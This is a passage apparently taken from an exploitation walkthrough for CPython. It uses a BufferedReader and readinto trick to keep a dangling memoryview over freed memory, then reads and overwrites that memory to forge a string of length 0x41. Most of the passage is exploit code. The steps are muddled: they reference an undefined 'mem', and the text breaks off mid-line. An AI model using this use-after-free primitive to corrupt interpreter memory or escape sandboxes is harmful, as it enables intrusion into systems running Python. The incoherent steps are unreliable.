import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f, File

global view
view[0] = mem[1]
```

examine the string that is stored at that address, and find its length (`len(mem[1])` or just `0x41`)

```python
import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(0x41)
del f, File
print( ''.join([chr(n) for n in view]) )

global view
del view
```

construct a different string of length `0x41` that differs from the original string at the same index as the first `\x00`.

```python
import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(0x
